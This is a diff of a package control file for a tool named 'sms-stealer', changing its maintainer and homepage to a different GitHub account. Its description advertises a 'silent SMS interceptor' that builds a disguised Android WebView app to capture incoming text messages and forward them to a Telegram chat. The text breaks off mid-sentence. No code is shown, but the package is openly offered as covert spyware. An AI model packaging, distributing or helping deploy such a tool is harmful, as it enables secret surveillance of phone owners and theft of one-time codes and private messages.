@@ -1,11 +1,11 @@
 Package: sms-stealer
 Version: 0.1.0
 Architecture: all
-Maintainer: Alienkrishn [Anon4You]
+Maintainer: Vaizer0
 Depends: git, ruby, apkeditor, apksigner
 Section: utils
 Priority: optional
-Homepage: https://github.com/Anon4You/sms-stealer
+Homepage: https://github.com/Vaizer0/zero-termux
 Description: Silent SMS interceptor via Telegram bot
  Builds a disguised Android WebView app that intercepts incoming
  SMS messages and forwards them to a Telegram chat. Useful for
